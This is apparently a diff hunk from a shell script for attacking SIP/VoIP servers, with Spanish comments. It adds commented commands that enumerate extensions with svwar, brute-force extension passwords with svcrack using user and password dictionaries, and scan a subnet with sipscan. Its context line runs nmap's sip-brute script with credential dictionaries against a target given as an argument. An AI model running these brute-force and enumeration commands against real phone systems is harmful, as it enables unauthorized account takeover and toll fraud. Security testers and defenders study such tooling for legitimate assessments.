@@ -41,5 +41,19 @@ fi
 echo
 echo 
 # deteccion: nmap -Pn -sS -sU -p 5060 --script sip-methods -O IP
+
+# Enumeración de extensiones
+# svwar -p5060 -e100-500 IP
+
+# Fuerza bruta a extensiones SIP
+# svcrack -u100 -d passwords.txt IP 
+
+# Ataque con diccionario de usuarios
+# svcrack -U users.txt -D passwords.txt 192.168.1.100
+
+# Escaneo de servicios SIP
+# sipscan 192.168.1.0/24
+
+# Ataque con diccionarios 
 nmap -Pn -p5060,5061 -sS -sU -O --script sip-brute --script-args userdb=usuarios0.txt,passdb=claves0.txt $1 -vvvv
 echo
